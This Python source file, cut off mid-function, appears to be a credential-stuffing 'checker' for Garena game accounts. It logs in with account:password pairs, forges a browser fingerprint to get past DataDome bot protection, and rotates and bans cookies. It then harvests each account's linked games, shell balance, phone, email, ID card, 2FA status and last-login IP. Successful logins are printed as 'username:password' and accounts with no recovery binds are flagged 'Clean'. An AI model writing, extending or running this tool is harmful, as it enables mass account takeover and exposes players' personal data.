# checker_logic.py
import os
import sys
import time
import random
import hashlib
import json
import logging
import urllib.parse
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
import threading
from Crypto.Cipher import AES
import requests
import signal
import cloudscraper
import colorama
from colorama import Fore, Style, Back
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn

# --- Your existing classes and functions (Colors, ColoredFormatter, CookieManager, encode, get_passmd5, hash_password, applyck, get_datadome_cookie, prelogin, login, get_codm_info, get_game_connections, parse_account_details, format_codm_info, format_game_info, format_success_output, show_summary, processaccount, get_fresh_cookie, find_nearest_account_file, format_time_delta, restart) go here unchanged ---
# For brevity, I'm omitting them here, but they should be copied directly from your original main.py

# Example:
class Colors:
    BLACK = colorama.Fore.BLACK
    RED = colorama.Fore.RED
    GREEN = colorama.Fore.GREEN
    YELLOW = colorama.Fore.YELLOW
    BLUE = colorama.Fore.BLUE
    MAGENTA = colorama.Fore.MAGENTA
    CYAN = colorama.Fore.CYAN
    WHITE = colorama.Fore.WHITE
    # ... (rest of Colors class) ...
    RESET = colorama.Style.RESET_ALL
    BRIGHT = colorama.Style.BRIGHT
    DIM = colorama.Style.DIM
    NORMAL = colorama.Style.NORMAL

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE,
        'INFO': colorama.Fore.GREEN,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
        'ORANGE': '\033[38;5;214m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'SUCCESS': '\033[92m',
        'FAIL': '\033[91m'
    }
    RESET = colorama.Style.RESET_ALL
    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        self.load_banned_cookies()

    def load_banned_cookies(self):
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())

    def is_banned(self, cookie):
        return cookie in self.banned_cookies

    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f:
            f.write(cookie + '\n')

    def get_valid_cookie(self):
        if os.path.exists('fresh_cookies.txt'):
            with open('fresh_cookies.txt', 'r') as f:
                valid_cookies = [c for c in f.read().splitlines()
                               if c.strip() and not self.is_banned(c.strip())]
            if valid_cookies:
                return random.choice(valid_cookies)
        return None

    def save_cookie(self, cookie):
        if not self.is_banned(cookie):
            with open('fresh_cookies.txt', 'a') as f:
                f.write(cookie + '\n')
            return True
        return False

def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        try:
            key, value = item.split("=")
            cookie_dict[key.strip()] = value.strip()
        except IndexError:
            logger.warning(f"⚠️ Skipping invalid cookie component: {item}")
    session.cookies.update(cookie_dict)
    logger.info(f"✅ Applied Cookie")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    payload = {
        'jsData': json.dumps({
            "ttst": 76.70000004768372, "ifov": False, "hc": 4, "br_oh": 824, "br_ow": 1536,
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "wbd": False, "dp0": True, "tagpu": 5.738121195951787, "wdif": False, "wdifrm": False,
            "npmtm": False, "br_h": 738, "br_w": 260, "isf": False, "nddc": 1, "rs_h": 864,
            "rs_w": 1536, "rs_cd": 24, "phe": False, "nm": False, "jsf": False, "lg": "en-US",
            "pr ": 1.25, "ars_h": 824, "ars_w": 1536, "tz": -480, "str_ss": True, "str_ls": True,
            "str_idb": True, "str_odb": False, "plgod": False, "plg": 5, "plgne": True, "plgre": True,
            "plgof": False, "plggt": False, "pltod": False, "hcovdr": False, "hcovdr2": False,
            "plovdr": False, "plovdr2": False, "ftsovdr": False, "ftsovdr2": False, "lb": False,
            "eva": 33, "lo": False, "ts_mtp": 0, "ts_tec": False, "ts_tsa": False, "vnd": "Google Inc.",
            "bid": "NA", "mmt": "application/pdf,text/pdf", "plu": "PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn": False, "awe": False, "geb": False, "dat": False, "med": "defined", "aco": "probably",
            "acots": False, "acmp": "probably", "acmpts": True, "acw": "probably", "acwts": False,
            "acma": "maybe", "acmats": False, "ac3": "", "ac3ts": False, "acf": "probably", "acfts": False,
            "acmp4": "maybe", "acmp4ts": False, "acmp3": "probably", "acmp3ts": False, "acwm": "maybe",
            "acwmts": False, "ocpt": False, "vco": "", "vcots": False, "vch": "probably", "vchts": True,
            "vcw": "probably", "vcwts": True, "vc3": "maybe", "vc3ts": False, "vcmp": "", "vcmpts": False,
            "vcq": "maybe", "vcqts": False, "vc1": "probably", "vc1ts": True, "dvm": 8, "sqt": False,
            "so": "landscape-primary", "bda": False, "wdw": True, "prm": True, "tzp": True, "cvs": True,
            "usb": True, "cap": True, "tbf": False, "lgs": True, "tpd": True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
    retries = 3
    for attempt in range(retries):
        try:
            response = requests.post(url, headers=headers, data=data) # Use requests directly here
            response.raise_for_status()
            response_json = response.json()
            if response_json['status'] == 200 and 'cookie' in response_json:
                cookie_string = response_json['cookie']
                datadome = cookie_string.split(';')[0].split('=')[1]
                logger.info(f"✅ DataDome cookie found")
                return datadome
            else:
                logger.error(f"⚠️ DataDome cookie not found in response. Status code: {response_json['status']}")
                logger.error(f"❌ Response content: {response.text[:200]}...")
                return None
        except requests.exceptions.RequestException as e:
            logger.error(f"⚠️ Error getting Data Dome cookie: {e}")
            if attempt < retries - 1:
                time.sleep(2)
    return None

def prelogin(session, account, max_retries=100):
    url = 'https://sso.garena.com/api/prelogin'
    params = {
        'app_id': '10100',
        'account': account,
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'connection': 'keep-alive',
        'host': 'sso.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Chromium";v="130", "Microsoft Edge";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0'
    }

    for attempt in range(max_retries):
        try:
            response = session.get(url, headers=headers, params=params)

            if response.status_code == 403:
                logger.warning(f"❌ 403 Forbidden for {account} (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    wait_time = (attempt + 1) * 3
                    logger.info(f"🕐 Retrying in {wait_time} seconds...")
                    time.sleep(wait_time)
                    continue
                else:
                    logger.error(f"❌ Max retries reached for {account}. Giving up.")
                    return None, None, None

            response.raise_for_status()
            data = response.json()
            new_datadome = response.cookies.get('datadome')

            if 'error' in data:
                logger.error(f"❌ Prelogin Account Failed:\n    Login: {account}\n    ╰┈➤ {data['error']}")
                return None, None, new_datadome

            logger.info(f"✅ Prelogin successful: {account}")
            return data.get('v1'), data.get('v2'), new_datadome

        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 403:
                logger.warning(f"❌ 403 Forbidden for {account} (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    wait_time = (attempt + 1) * 3
                    logger.info(f"🕐 Retrying in {wait_time} seconds...")
                    time.sleep(wait_time)
                    continue
                else:
                    logger.error(f"❌ Max retries reached for {account}. Giving up.")
                    return None, None, None
            else:
                logger.error(f"❌ HTTP error in prelogin for {account}: {e}")
                if attempt < max_retries - 1:
                    time.sleep(3)
                    continue

        except Exception as e:
            logger.error(f"❌ Error fetching prelogin data for {account}: {e}")
            if attempt < max_retries - 1:
                time.sleep(3)
                continue

    return None, None, None

def login(session, account, password, v1, v2, max_retries=3):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    headers = {
        'accept': 'application/json, text/plain, */*',
        'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
    }

    for attempt in range(max_retries):
        try:
            response = session.get(url, headers=headers, params=params)

            if response.status_code == 403:
                logger.warning(f"❌ 403 Forbidden during login for {account} (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    wait_time = (attempt + 1) * 3
                    logger.info(f"🕐 Retrying login in {wait_time} seconds...")
                    time.sleep(wait_time)
                    continue

            response.raise_for_status()
            data = response.json()
            sso_key = response.cookies.get('sso_key')

            if 'error' in data:
                logger.error(f"❌ Account Check Failed:\n    ╰┈➤ {data['error']}")
                return None

            logger.info(f"✅ Logged in: {account}")
            return sso_key

        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 403:
                logger.warning(f"❌ 403 Forbidden during login for {account} (attempt {attempt + 1}/{max_retries})")
                if attempt < max_retries - 1:
                    wait_time = (attempt + 1) * 3
                    logger.info(f"🕐 Retrying login in {wait_time} seconds...")
                    time.sleep(wait_time)
                    continue
            else:
                logger.error(f"❌ HTTP error in login for {account}: {e}")
                if attempt < max_retries - 1:
                    time.sleep(2)
                    continue

        except requests.RequestException as e:
            logger.error(f"❌ Account Check Failed:\n    ╰┈➤ {e}")
            if attempt < max_retries - 1:
                time.sleep(2)
                continue

    return None

def get_codm_info(session, account):
    codm_info = {}
    has_codm = False

    try:
        random_id = str(int(time.time() * 1000))
        token_url = "https://auth.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/"
        }
        token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id

        token_response = session.post(token_url, headers=token_headers, data=token_data)
        token_data = token_response.json()
        access_token = token_data.get("access_token", "")

        if not access_token:
            logger.warning(f"⚠️ No CODM access token for {account}")
            return has_codm, codm_info


        codm_callback_url = f"https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token={access_token}"
        callback_headers = {
            "authority": "auth.codm.garena.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }

        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)


        api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        api_callback_headers = {
            "authority": "api-delete-request.codm.garena.co.id",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "referer": "https://auth.garena.com/",
            "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "cross-site",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }

        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
        location = api_callback_response.headers.get("Location", "")

        if "err=3" in location:
            logger.info(f"⚠️ CODM callback returned err=3 for {account}, no CODM detected")
            return has_codm, codm_info
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]


            check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
            check_headers = {
                "authority": "api-delete-request.codm.garena.co.id",
                "accept": "application/json, text/plain, */*",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "codm-delete-token": token,
                "origin": "https://delete-request.codm.garena.co.id",
                "pragma": "no-cache",
                "referer": "https://delete-request.codm.garena.co.id/",
                "sec-ch-ua": "\"Chromium\";v=\"107\", \"Not=A?Brand\";v=\"24\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
            }

            check_response = session.get(check_login_url, headers=check_headers)
            check_data = check_response.json()

            user_data = check_data.get("user", {})
            if user_data:
                has_codm = True
                codm_level = user_data.get("codm_level", "N/A")
                if codm_level == "N/A" or codm_level == "" or codm_level is None:
                    codm_level = "Unknown"

                codm_info = {
                    "codm_nickname": user_data.get("codm_nickname", "N/A"),
                    "codm_level": codm_level,
                    "region": user_data.get("region", "N/A"),
                    "uid": user_data.get("uid", "N/A"),
                    "open_id": user_data.get("open_id", "N/A"),
                    "t_open_id": user_data.get("t_open_id", "N/A")
                }
                logger.info(f"✅ CODM detected for {account}: Level {codm_info['codm_level']}")

    except Exception as e:
        logger.error(f"❌ Error getting CODM info for {account}: {e}")

    return has_codm, codm_info

def get_game_connections(session, account):

    game_info = []
    valid_regions = {'sg', 'ph', 'my', 'tw', 'th', 'id', 'in', 'vn'}

    game_mappings = {
        'tw': {
            "100082": "CODM",
            "100067": "FREE FIRE",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100105": "GARENA UNDAWN",
            "100050": "ROV",
            "100151": "DELTA FORCE",
            "100147": "FAST THRILL",
            "100107": "MOONLIGHT BLADE"
        },
        'th': {
            "100067": "FREEFIRE",
            "100055": "ROV",
            "100082": "CODM",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100130": "BLACK CLOVER M",
            "100070": "SPEED DRIFTERS",
            "32836": "FC ONLINE",
            "100071": "FC ONLINE M",
            "100124": "MOONLIGHT BLADE"
        },
        'vn': {
            "32837": "FC ONLINE",
            "100072": "FC ONLINE M",
            "100054": "ROV",
            "100137": "THE WORLD OF WAR"
        },
        'default': {
            "100082": "CODM",
            "100067": "FREEFIRE",
            "100151": "DELTA FORCE",
            "100105": "GARENA UNDAWN",
            "100057": "AOV",
            "100070": "SPEED DRIFTERS",
            "100130": "BLACK CLOVER M",
            "100055": "ROV"
        }
    }

    try:

        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"

        token_response = session.post(token_url, headers=token_headers, data=token_data)
        access_token = token_response.json().get("access_token", "")

        if not access_token:
            logger.warning(f"⚠️ No access token for {account}")
            return ["No game connections found"]


        inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
        inspect_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }
        inspect_data = {"token": access_token}

        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data)
        session_key_roles = inspect_response.cookies.get('session_key')
        if not session_key_roles:
            logger.warning(f"⚠️ No session_key in response cookies for {account}")
            return ["No game connections found"]

        inspect_data = inspect_response.json()
        uac = inspect_data.get("uac", "ph").lower()
        region = uac if uac in valid_regions else 'ph'


        if region == 'th' or region == 'in':
            base_domain = "termgame.com"
        elif region == 'id':
            base_domain = "kiosgamer.co.id"
        elif region == 'vn':
            base_domain = "napthe.vn"
        else:
            base_domain = f"shop.garena.{region}"


        applicable_games = game_mappings.get(region, game_mappings['default'])
        detected_roles = {}

        for app_id, game_name in applicable_games.items():
            roles_url = f"https://{base_domain}/api/shop/apps/roles"
            params_roles = {'app_id': app_id}
            headers_roles = {
                'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
                'Accept': "application/json, text/plain, */*",
                'Accept-Language': "en-US,en;q=0.5",
                'Accept-Encoding': "gzip, deflate, br, zstd",
                'Connection': "keep-alive",
                'Referer': f"https://{base_domain}/?app={app_id}",
                'Sec-Fetch-Dest': "empty",
                'Sec-Fetch-Mode': "cors",
                'Sec-Fetch-Site': "same-origin",
                'Cookie': f"session_key={session_key_roles}"
            }

            try:
                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles)
                roles_data = roles_response.json()

                role = None
                if isinstance(roles_data.get("role"), list) and roles_data["role"]:
                    role = roles_data["role"][0]
                elif app_id in roles_data and isinstance(roles_data[app_id], list) and roles_data[app_id]:
                    role = roles_data[app_id][0].get("role", None)

                if role:
                    detected_roles[app_id] = role
                    game_info.append(f"[{region.upper()} - {game_name} - {role}]")

            except Exception as e:
                logger.warning(f"⚠️ Error checking game {game_name} for {account}: {e}")

        if not game_info:
            game_info.append(f"[{region.upper()} - No Game Detected]")

    except Exception as e:
        logger.error(f"❌ Error getting game connections for {account}: {e}")
        game_info.append("[Error fetching game data]")

    return game_info

def parse_account_details(data):
    user_info = data.get('user_info', {})


    mobile_no = user_info.get('mobile_no', 'N/A')
    country_code = user_info.get('country_code', '')

    if mobile_no != 'N/A' and mobile_no and country_code:
        formatted_mobile = f"+{country_code}{mobile_no}"
    else:
        formatted_mobile = mobile_no


    mobile_bound = bool(mobile_no and mobile_no != 'N/A' and mobile_no.strip())


    email = user_info.get('email', 'N/A')
    email_verified = bool(user_info.get('email_v', 0))
    email_actually_bound = bool(email != 'N/A' and email and email_verified)

    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': email,
        'email_verified': email_verified,
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),

        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },

        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': country_code,
            'mobile_no': formatted_mobile,
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) else "Not Bound",
            'mobile_actually_bound': mobile_bound,
            'extra_data': user_info.get('realinfo_extra_data', {})
        },

        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },

        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },

        'binds': [],
        'game_info': []
    }


    if email_actually_bound:
        account_info['binds'].append('Email')


    if account_info['personal']['mobile_actually_bound']:
        account_info['binds'].append('Phone')


    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')


    if account_info['personal']['id_card'] != 'N/A' and account_info['personal']['id_card']:
        account_info['binds'].append('ID Card')

    account_info['bind_status'] = "Clean" if not account_info['binds'] else f"Bound ({', '.join(account_info['binds'])})"
    account_info['is_clean'] = len(account_info['binds']) == 0

    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append("2FA")
    if account_info['security']['authenticator_app']:
        security_indicators.append("Auth App")
    if account_info['security']['suspicious']:
        security_indicators.append("⚠️ Suspicious")

    account_info['security_status'] = "✅ Normal" if not security_indicators else " | ".join(security_indicators)

    return account_info

def format_codm_info(codm_info):

    if not codm_info:
        return "  No CODM data available"

    formatted = ""
    formatted += f"  {Colors.YELLOW}-> CODM Nickname    : {Colors.YELLOW}{codm_info.get('codm_nickname', 'N/A')}\n"
    formatted += f"  {Colors.YELLOW}-> CODM Level       : {Colors.YELLOW}{codm_info.get('codm_level', 'N/A')}\n"
    formatted += f"  {Colors.YELLOW}-> CODM Region      : {Colors.YELLOW}{codm_info.get('region', 'N/A')}\n"
    formatted += f"  {Colors.YELLOW}-> CODM UID         : {Colors.YELLOW}{codm_info.get('uid', 'N/A')}\n"
    formatted += f"  {Colors.YELLOW}-> CODM Open ID     : {Colors.YELLOW}{codm_info.get('open_id', 'N/A')}"

    return formatted

def format_game_info(game_info):

    if not game_info:
        return "  No game connections found"

    formatted = ""
    for i, game in enumerate(game_info):
        if i < len(game_info) - 1:
            formatted += f"  {Colors.WHITE}↳ {game}\n"
        else:
            formatted += f"  {Colors.WHITE}↳ {game}"

    return formatted

def format_success_output(account, password, details, codm_info, game_info, line_color=Colors.CYAN):
    current_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    login_history = details.get("login_history", [])
    last_login_info = login_history[0] if login_history else {}

    username = details.get('username', account)
    last_login = last_login_info.get('timestamp', 0)
    last_login_date = time.strftime("%Y-%m-%d %H:%M", time.localtime(last_login)) if last_login else "N/A"
    last_login_where = f"{last_login_info.get('source', 'Unknown')}" if last_login_info else "Unknown"
    ipk = last_login_info.get('ip', 'N/A') if last_login_info else 'N/A'
    ipc = last_login_info.get('country', 'N/A') if last_login_info else 'N/A'

    email = details['email']
    if email != 'N/A' and '@' in email:
        email_parts = email.split('@')
        if len(email_parts[0]) > 2:
            masked_email = f"{email_parts[0][:3]}****{email_parts[0][-1]}@{email_parts[1]}"
        else:
            masked_email = f"****@{email_parts[1]}"
    else:
        masked_email = email

    mobile_bound = f"{Colors.GREEN}Yes" if details['personal']['mobile_actually_bound'] else f"{Colors.RED}No"
    email_ver = f"{Colors.GREEN}Verified" if details['email_verified'] else f"{Colors.RED}Not Verified"
    fb_linked = f"{Colors.GREEN}Yes" if details['security']['facebook_connected'] else f"{Colors.RED}No"
    authenticator_enabled = f"{Colors.GREEN}Enabled" if details['security']['authenticator_app'] else f"{Colors.RED}Disabled"
    two_step_enabled = f"{Colors.GREEN}Enabled" if details['security']['two_step_verify'] else f"{Colors.RED}Disabled"
    clean_status = f"{Colors.GREEN}Clean" if details['is_clean'] else f"{Colors.RED}Bound"

    safe_avatar = details['profile']['avatar'] if details['profile']['avatar'] != 'N/A' else 'No Avatar'
    codm_nickname = codm_info.get('codm_nickname', 'N/A')
    codm_level = codm_info.get('codm_level', 'N/A')

    fb_username = "N/A"
    fb_uid = "N/A"
    if details['security']['facebook_account']:
        fb_username = details['security']['facebook_account'].get('fb_username', 'N/A')
        fb_uid = details['security']['facebook_account'].get('fb_uid', 'N/A')

    output = f"\n{Colors.LIGHTGREEN_EX}[✔ LOGIN SUCCESSFUL]{colorama.Style.RESET_ALL}\n\n"

    output += f"{Colors.YELLOW}-> ACCOUNT INFO:{colorama.Style.RESET_ALL}\n"
    output += f"  {Colors.YELLOW}-> Username: {Colors.YELLOW}{username}:{password}\n"
    output += f"  {Colors.YELLOW}-> Last Login: {Colors.YELLOW}{last_login_date}\n"
    output += f"  {Colors.YELLOW}-> Location: {Colors.YELLOW}{last_login_where}\n"
    output += f"  {Colors.YELLOW}-> IP Address: {Colors.YELLOW}{ipk}\n"
    output += f"  {Colors.YELLOW}-> Login Country: {Colors.YELLOW}{ipc}\n"
    output += f"  {Colors.YELLOW}-> User Country: {Colors.YELLOW}{details['personal']['country']}\n"

    output += f"{line_color}-> ACCOUNT DETAILS:{colorama.Style.RESET_ALL}\n"
    output += f"  {Colors.YELLOW}-> Garena Shells: {Colors.YELLOW}{details['profile']['shell_balance']}\n"
    output += f"  {Colors.YELLOW}-> Mobile: {Colors.YELLOW}{details['personal']['mobile_no']}\n"
    output += f"  {Colors.YELLOW}-> Email: {Colors.YELLOW}{details['email']} ({email_ver})\n"
    output += f"  {Colors.YELLOW}-> FB Username: {Colors.GREEN}{details['security']['facebook_account'] or 'N/A'}\n"

    output += f"{line_color}-> GAME INFORMATION:{colorama.Style.RESET_ALL}\n"
    output += f"{format_game_info(game_info)}\n"

    if codm_info and codm_nickname != 'N/A':
        output += f"  {Colors.YELLOW}-> CODM Nickname    : {Colors.YELLOW}{codm_nickname}\n"
        output += f"  {Colors.YELLOW}-> CODM Level       : {Colors.YELLOW}{codm_level}\n"
        output += f"  {Colors.YELLOW}-> CODM UID         : {Colors.YELLOW}{codm_info.get('uid', 'N/A')}\n"


    output += f"{line_color}-> SECURITY STATUS:{colorama.Style.RESET_ALL}\n"
    output += f"  {Colors.YELLOW}-> Mobile Bound: {mobile_bound}\n"
    output += f"  {Colors.YELLOW}-> Email Verified: {email_ver}\n"
    output += f"  {Colors.YELLOW}-> Authenticator: {authenticator_enabled}\n"
    output += f"  {Colors.YELLOW}-> 2FA Enabled: {two_step_enabled}\n"
    output += f"  {Colors.YELLOW}-> Account Status: {clean_status}\n"

    output += f"{Colors.YELLOW}-------------------------{colorama.Style.RESET_ALL}\n"

    plain_output = f"""
[✔] Login Successful

->  ACCOUNT INFO:
    -> Username: {username}:{password}
    -> Last Login: {last_login_date}
    -> Location: {last_login_where}
    -> IP Address: {ipk}
